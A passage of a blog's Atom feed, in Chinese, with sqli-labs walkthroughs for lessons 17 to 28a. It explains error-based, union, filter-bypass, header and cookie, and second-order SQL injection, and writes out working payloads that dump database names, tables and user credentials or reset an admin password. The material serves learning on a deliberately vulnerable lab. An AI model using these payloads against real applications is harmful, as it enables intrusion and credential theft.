title="爆库："></a>爆库：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1</p><p>得，<img src="/2021/02/04/lesson25-28a/7.png" alt="7"></p><h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p><p>得，<img src="/2021/02/04/lesson25-28a/8.png" alt="8"></p><h3 id="爆列：-1"><a href="#爆列：-1" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1</p><p>得，<img src="/2021/02/04/lesson25-28a/9.png" alt="9"></p><h3 id="爆值：-1"><a href="#爆值：-1" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1</p><p>得，<img src="/2021/02/04/lesson25-28a/10.png" alt="10"></p><p>这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat(  concat_ws(0x7e,username,passwoorrd)  )) from (security.users)  where(id=5))) ,1)  || ‘1’=’1</p><h2 id="lesson26a："><a href="#lesson26a：" class="headerlink" title="lesson26a："></a>lesson26a：</h2><p>当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。</p><h2 id="lesson27："><a href="#lesson27：" class="headerlink" title="lesson27："></a>lesson27：</h2><p>同lesson26，报错注入。</p><p>源码：</p><p><img src="/2021/02/04/lesson25-28a/11.png" alt="11"></p><ul><li><p>若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。</p></li><li><p>这关取消了对and和or的过滤。</p></li></ul><h2 id="lesson27a："><a href="#lesson27a：" class="headerlink" title="lesson27a："></a>lesson27a：</h2><p>不能使用报错注入。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lesson25：&quot;&gt;&lt;a href=&quot;#lesson25：&quot; class=&quot;headerlink&quot; title=&quot;lesson25：&quot;&gt;&lt;/a&gt;lesson25：&lt;/h2&gt;&lt;p&gt;这一关它告诉我们and和or都被过滤了。&lt;/p&gt;
&lt;p&gt;一般，绕开过滤的方法有以下几</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson24</title>
    <link href="http://example.com/2021/02/03/lesson24/"/>
    <id>http://example.com/2021/02/03/lesson24/</id>
    <published>2021-02-03T13:07:57.000Z</published>
    <updated>2021-02-05T03:21:09.205Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lesson24："><a href="#lesson24：" class="headerlink" title="lesson24："></a>lesson24：</h2><p>这关感觉很有意思。以往的SQL注入都是一阶注入，而这一关出现了二阶注入。先介绍一下二阶注入：</p><p><strong>二阶注入也叫存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就会触发sql 注入</strong>。</p><p><img src="/lesson24/2.png" alt="2"></p><p>我们先在页面上做一些试探。</p><ul><li>点击：Forgot your password？</li></ul><p>页面跳转：<img src="/2021/02/03/lesson24/1.png" alt="1"></p><p>大意是如果你忘了你的密码，就自己黑了他。那么我们肯定不能在这里下手了。</p><ul><li>点击：New User click here?</li><li>页面跳转：<img src="/2021/02/03/lesson24/3.png" alt="3"></li></ul><p>我们看到这就是一个普通的注册界面，有什么用呢，我们先暂不言表。</p><p>我们接着试探，输入正确账号密码，进入到一个修改密码的网页：</p><p><img src="/2021/02/03/lesson24/4.png" alt="4"></p><p>不知道哪个地方可以注入，我们先<strong>打开login的源码：</strong></p><p><img src="/2021/02/03/lesson24/6.png" alt="6"></p><p>发现登入页面输入的账号密码都被转义了，那么肯定不能直接注入，接着看代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;username&quot;] = $login;</span><br></pre></td></tr></table></figure><p>发现它设了一个新变量储存从数据库中选择出来的username的值。</p><p><strong>打开pass_change的源码：</strong><img src="/2021/02/03/lesson24/5.png" alt="5"></p><p>我们可以看出从改密码的页面注入是不可行的了，但是我们发现从数据库中选择出来的username没有被复查，直接构造成sql语句，带入到数据库中。于是我们就可以有这样一种思路，我们先注册一个账号，例如：账户：admin’#（admin为目标用户名），密码：123。</p><p>然后我们输入我们注册的这个账号密码登入，进入修改密码页面，</p><p>pass_change的源码中sql语句是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span> <span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>而登入我们注册的账户后，sql语句被篡改为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span></span><br><span class="line">相当于：</span><br><span class="line">$<span class="keyword">sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>也就是说，我们达到了无需知道目标账户密码而可以修改目标账户的密码，进而通过修改的新密码登入目标账户。</p><p><strong>但是这里有个问题：我们输入的单引号不是被转义了吗，那它构造的sql语句怎么还会起作用呢？</strong></p><p>原来转义只是暂时的，数据存储到数据库以后还是以原句的形式存在，反斜杠不会随之插入数据库。</p><p>注：我发现这样注入还是很有局限性的，因为你只能一个一个去破解，如果通过注册账户时构造payload，会受到字节长度的限制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lesson24：&quot;&gt;&lt;a href=&quot;#lesson24：&quot; class=&quot;headerlink&quot; title=&quot;lesson24：&quot;&gt;&lt;/a&gt;lesson24：&lt;/h2&gt;&lt;p&gt;这关感觉很有意思。以往的SQL注入都是一阶注入，而这一关出现了二阶注入。先介绍一下二</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson23</title>
    <link href="http://example.com/2021/02/03/lesson23/"/>
    <id>http://example.com/2021/02/03/lesson23/</id>
    <published>2021-02-03T10:52:07.000Z</published>
    <updated>2021-02-04T03:15:42.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lesson23："><a href="#lesson23：" class="headerlink" title="lesson23："></a>lesson23：</h2><p>这关又变回了get请求类型。</p><p>在url行输入：?id=1, 发现有回显。</p><p>输入：?id=1’，报sql语法错误；</p><p>输入：?id=1’ or ‘1’=’1 ，登入成功；</p><p>输入：?id=1’ and ‘1’=’2 ，登入失败。因此确定为单引号类型注入。</p><p>因为有回显，那么接下来使用联合注入就可以了，详情参考lesson1，不再赘述。</p><p>但是有一个点值得注意，就是我在构造payload语句时，我发现我若以  <code>&#39;--+&#39;</code>   或者 <code>#</code>  结尾则页面返回sql语法错误，于是我查看源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = &quot;/<span class="comment">#/&quot;;</span></span><br><span class="line">$reg1 = &quot;/<span class="comment">--/&quot;;</span></span><br><span class="line">$<span class="keyword">replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$id = preg_replace($reg, $<span class="keyword">replace</span>, $<span class="keyword">id</span>);</span><br><span class="line">$id = preg_replace($reg1, $<span class="keyword">replace</span>, $<span class="keyword">id</span>);</span><br></pre></td></tr></table></figure><p><strong>介绍一下preg_replace()函数：</strong></p><p><img src="/2021/02/03/lesson23/1.png" alt="1"></p><p>因此我们得知  <code>&#39;--+&#39;</code>   和 <code>#</code>  都被屏蔽掉了，那么我们要怎么闭合sql语句呢？</p><h5 id="1-union注入时"><a href="#1-union注入时" class="headerlink" title="1.union注入时"></a>1.union注入时</h5><p>以爆库为例：?id=-1’  union select 1,database(),’3   </p><p>​               或：?id=-1’  union select 1,database(),3 or ‘1’=’ </p><h5 id="2-报错注入时"><a href="#2-报错注入时" class="headerlink" title="2.报错注入时"></a>2.报错注入时</h5><p>以爆库为例：?id=-1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or ‘1’=’     </p><p>​              </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lesson23：&quot;&gt;&lt;a href=&quot;#lesson23：&quot; class=&quot;headerlink&quot; title=&quot;lesson23：&quot;&gt;&lt;/a&gt;lesson23：&lt;/h2&gt;&lt;p&gt;这关又变回了get请求类型。&lt;/p&gt;
&lt;p&gt;在url行输入：?id=1, 发现有回显</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson21-22</title>
    <link href="http://example.com/2021/02/03/lesson21-22/"/>
    <id>http://example.com/2021/02/03/lesson21-22/</id>
    <published>2021-02-03T03:45:46.000Z</published>
    <updated>2021-02-03T10:43:31.553Z</updated>
    
    <content type="html"><![CDATA[<p>这关虽然和lesson18很像，但是还是有很多东西值得开一篇新的blog。</p><h2 id="lesson21："><a href="#lesson21：" class="headerlink" title="lesson21："></a>lesson21：</h2><p>首先输入正确的用户名，密码，用burp抓包：</p><p><img src="/2021/02/03/lesson21-22/1.png" alt="1"></p><p>我们看到cookie一行的uname=被加密了，我们查看源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600);</span><br></pre></td></tr></table></figure><p><strong>sp：介绍一下setcookie（）函数：</strong></p><p>setcookie() 函数向客户端发送一个 HTTP cookie。</p><p>cookie 是由服务器发送到浏览器的变量。cookie 通常是服务器嵌入到用户计算机中的小文本文件。每当同一台计算机通过浏览器请求页面时，就会发送这个 cookie。</p><p>cookie 的名称自动指定为相同名称的变量。例如，如果被发送的 cookie 名为 “user”，则会自动创建一个名为 $user 的变量，包含 cookie 的值。</p><p>必须在任何其他输出发送到客户端前对 cookie 进行赋值。</p><p>如果成功，该函数返回 TRUE。如果失败则返回 FALSE。</p><p><img src="/2021/02/03/lesson21-22/2.png" alt="2"></p><p>因此我们可以看到cookie的值被加密了。接着看源码：</p><p><img src="/2021/02/03/lesson21-22/3.png" alt="3"></p><p>至此，我们可以确信还是从cookie进行注入，不过要将payload进行base64加密。</p><p>在线编译网站：<a href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p><p>那么开始注入吧！</p><p>法1：报错注入，类似于lesson18，不过多赘述了，构造payload然后在网站上加密，再添加到cookie上。</p><p>法2：union联合注入，因为当我们输入正确的账号密码的时候，我们可以看到页面有回显。因此我们可以通过order by函数来查字节。剩下的就是以前学的内容了，不再赘述。</p><h2 id="lesson22："><a href="#lesson22：" class="headerlink" title="lesson22："></a>lesson22：</h2><p>这一关和lesson21差不多，就是注入类型变成了双引号，其余一致。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这关虽然和lesson18很像，但是还是有很多东西值得开一篇新的blog。&lt;/p&gt;
&lt;h2 id=&quot;lesson21：&quot;&gt;&lt;a href=&quot;#lesson21：&quot; class=&quot;headerlink&quot; title=&quot;lesson21：&quot;&gt;&lt;/a&gt;lesson21：&lt;/h2&gt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议</title>
    <link href="http://example.com/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-02-02T14:56:16.000Z</published>
    <updated>2021-04-15T12:31:34.645Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/1.png" alt="1"></p><p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/2.png" alt="2"></p><p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/3.png" alt="3"></p><p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/4.png" alt="4"></p><p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/5.png" alt="5"></p><p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/6.png" alt="6"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    
    <category term="HTTP" scheme="http://example.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>lesson18-20</title>
    <link href="http://example.com/2021/02/01/lesson18-20/"/>
    <id>http://example.com/2021/02/01/lesson18-20/</id>
    <published>2021-02-01T12:33:49.000Z</published>
    <updated>2021-02-03T05:12:25.102Z</updated>
    
    <content type="html"><![CDATA[<h3 id="lesson18："><a href="#lesson18：" class="headerlink" title="lesson18："></a>lesson18：</h3><p>这一题看过去和lesson17没什么差别，就多了一行id地址，我们查看源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]);</span><br><span class="line">$passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br></pre></td></tr></table></figure><p>可知，数据库对输入的username和password都做了过滤，所以我们想通过页面输入获取数据库信息的方法肯定是走不通了。我们再看源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure><p>源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分: User-Agent 。<br>而获取IP则使用了RENOTE_ADDR，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但修改XFF头就可以更改的。我们继续往下看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure><p>从这里我们可以看到我们的uagent等会被带入到数据库中，那么我们好像可以通过对uagent进行改写，构造payload。</p><p>然后我们现在在页面输入正确账号密码后，发现页面回显：<img src="/2021/02/01/lesson18-20/1.png" alt="1"></p><p>那么我们更可以确定是对User-Agent 下手。</p><p>通过第三段源码我们可以得知注入类型为：’  ;</p><p>于是我们可以开始用burp suite抓包：<img src="/2021/02/01/lesson18-20/2.png" alt="2"></p><h5 id="payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1"><a href="#payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1" class="headerlink" title="payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#"></a>payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#</h5><p>其中clase为想要查询的子句；源码的insert语句中原本有三个参数（用三个1表示）——（1，1*，1**），然后1被<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>  替换，后面1*和1**是为了和insert语句中参数数量一致，否则会报错：<img src="/2021/02/01/lesson18-20/7.png" alt="7"></p><p>当updatexml函数报错以后，数据库就不会去检查1*和1**了。</p><p>注：<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>带入到源码中 <code>&#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)</code>，第一处合并是空，所以uagent把updatexml函数的值带入数据库。</p><h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forword，得：<img src="/2021/02/01/lesson18-20/3.png" alt="3"></p><h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forword，得：<img src="/2021/02/01/lesson18-20/4.png" alt="4"></p><p>注：因为我之前在security数据库里创了表，现在导致表太多了，而报错的长度有限，不能查到所有表。然后我想用limit函数限制查询数量，但是我尝试了好久没有成功，先留个坑吧！！！！！！！！！！！！！！！！！！</p><h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forword，得：</p><p><img src="/2021/02/01/lesson18-20/5.png" alt="5"></p><h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;<span class="comment">#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forword，得：</p><p><img src="/2021/02/01/lesson18-20/6.png" alt="6"></p><h3 id="lesson19："><a href="#lesson19：" class="headerlink" title="lesson19："></a>lesson19：</h3><p>这一关和lesson18差不多，只不过改在Referer处写payload。</p><h3 id="lesson20："><a href="#lesson20：" class="headerlink" title="lesson20："></a>lesson20：</h3><p>这一关和lesson18也是类似，不过在cookie处写payload，而且因为当输入正确账号密码的时候，网页会回显，所以也可以采用union联合注入。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;lesson18：&quot;&gt;&lt;a href=&quot;#lesson18：&quot; class=&quot;headerlink&quot; title=&quot;lesson18：&quot;&gt;&lt;/a&gt;lesson18：&lt;/h3&gt;&lt;p&gt;这一题看过去和lesson17没什么差别，就多了一行id地址，我们查看源码：&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson17</title>
    <link href="http://example.com/2021/01/31/lesson17/"/>
    <id>http://example.com/2021/01/31/lesson17/</id>
    <published>2021-01-31T13:26:30.000Z</published>
    <updated>2021-02-09T09:56:05.957Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lesson17："><a href="#lesson17：" class="headerlink" title="lesson17："></a>lesson17：</h1><p>这一关不管我们在username上构造什么payload都无法篡改数据库。</p><p>我们查看源码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value))</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,15);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="先认识一下陌生函数："><a href="#先认识一下陌生函数：" class="headerlink" title="先认识一下陌生函数："></a>先认识一下陌生函数：</h4><h5 id="1-get-magic-quotes-gpc-函数"><a href="#1-get-magic-quotes-gpc-函数" class="headerlink" title="1.get_magic_quotes_gpc()函数"></a>1.get_magic_quotes_gpc()函数</h5><p>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p><p>注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。</p><h5 id="2-addslashes-函数"><a href="#2-addslashes-函数" class="headerlink" title="2.addslashes()函数"></a>2.addslashes()函数</h5><p>addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\的字符串。</p><h5 id="3-stripslashes-函数"><a href="#3-stripslashes-函数" class="headerlink" title="3.stripslashes()函数"></a>3.stripslashes()函数</h5><p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p><p>注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。</p><h5 id="4-ctype-digit-函数"><a href="#4-ctype-digit-函数" class="headerlink" title="4.ctype_digit()函数"></a>4.ctype_digit()函数</h5><p>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p><h5 id="5-mysql-real-escape-string-函数"><a href="#5-mysql-real-escape-string-函数" class="headerlink" title="5.mysql_real_escape_string()函数"></a>5.mysql_real_escape_string()函数</h5><p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/2021/01/31/lesson17/1.png" alt="1"></p><p><strong>sp：</strong>怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。</p><p>我们观察源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以转变思路可以从password下手。</p><p>输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’  ;</p><p><strong>！这里介绍一个注入方法：</strong></p><h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3><h5 id="A-常用函数："><a href="#A-常用函数：" class="headerlink" title="A.常用函数："></a>A.常用函数：</h5><h6 id="1-updatexml-函数："><a href="#1-updatexml-函数：" class="headerlink" title="1.updatexml()函数："></a>1.updatexml()函数：</h6><p>updatexml(xml_doc,xpath,new_value)函数有三个参数，分别是(xml_document, XPath_string, new_value)—-</p><p>第一个参数：xml_document， String格式，为XML文档对象的名称；</p><p>第二个参数：XPath_string (Xpath格式的字符串)；</p><p>第三个参数：new_value， String格式，替换查找到的符合条件的数据；</p><p>该函数的作用就是把xml文档中的指定字符串替换成新值。</p><p><img src="/2021/01/31/lesson17/2.png" alt="2"></p><h6 id="2-extractvalue-函数："><a href="#2-extractvalue-函数：" class="headerlink" title="2.extractvalue()函数："></a>2.extractvalue()函数：</h6><p>extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。</p><h5 id><a href="#" class="headerlink" title></a><img src="/2021/01/31/lesson17/3.png" alt="3"></h5><h5 id="B-报错注入原理："><a href="#B-报错注入原理：" class="headerlink" title="B.报错注入原理："></a>B.报错注入原理：</h5><p>(1)参数xpath需要的是xpath格式的字符串，不是就会报错。</p><p>(2))当xpath路径语法错误时，就会报错。</p><p>注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。</p><p>懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。</p><h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=(anything)&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;, database()),1)#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/31/lesson17/4.png" alt="4"></p><p>注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。</p><h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/31/lesson17/5.png" alt="5"></p><h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/31/lesson17/6.png" alt="6"></p><h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/31/lesson17/7.png" alt="7"></p><h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.爆值的时候需要注意，不能直接用简单的<code>select 